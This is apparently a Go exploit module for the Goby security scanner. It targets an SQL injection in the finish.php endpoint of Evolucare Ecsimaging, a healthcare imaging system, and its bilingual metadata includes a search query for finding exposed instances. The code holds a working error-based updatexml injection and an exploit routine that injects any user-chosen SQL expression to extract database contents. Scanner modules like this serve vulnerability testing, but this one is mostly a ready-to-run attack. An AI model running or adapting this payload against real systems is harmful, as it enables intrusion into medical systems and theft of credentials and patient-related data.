package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Evolucare Ecsimaging 6.21.5 finish.php file sql vulnerability",
    "Description": "<p>Evolucare is a health management system for healthcare IT.</p><p>Before Evolucare version 6.21.5, there was a sql injection vulnerability, and attackers could obtain sensitive information such as username and password.</p>",
    "Impact": "<p>Before Evolucare version 6.21.5, there was a sql injection vulnerability, and attackers could obtain sensitive information such as username and password.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.evolucare.com/\">https://www.evolucare.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Evolucare Ecsimaging",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Evolucare Ecsimaging 健康管理系统 6.21.5 版本 finish.php 文件 SQL 注入漏洞",
            "Product": "Evolucare Ecsimaging",
            "Description": "<p>Evolucare Ecsimaging 是医疗保健 IT 的健康管理系统。</p><p>Evolucare Ecsimaging 6.21.5 版本之前存在sql注入漏洞，攻击者可获取用户名密码等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.evolucare.com/\">https://www.evolucare.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Evolucare 6.21.5版本之前存在sql注入漏洞，攻击者可获取用户名密码等敏感信息。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Evolucare Ecsimaging 6.21.5 finish.php file sql vulnerability",
            "Product": "Evolucare Ecsimaging",
            "Description": "<p>Evolucare is a health management system for healthcare IT.</p><p>Before Evolucare version 6.21.5, there was a sql injection vulnerability, and attackers could obtain sensitive information such as username and password.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.evolucare.com/\">https://www.evolucare.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Before Evolucare version 6.21.5, there was a sql injection vulnerability, and attackers could obtain sensitive information such as username and password.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"ECSimaging\"",
    "GobyQuery": "body=\"ECSimaging\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.evolucare.com/",
    "DisclosureDate": "2022-02-21",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5508"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10259"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/ecnc/finish.php?OR=1%20and%201=(updatexml(1,concat(0x3a,(select%20md5(123))),1))"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "202cb962ac59075b964b07152d234b7")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/ecnc/finish.php?OR=1%%20and%%201=(updatexml(1,concat(0x3a,(select%%20%s)),1))", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
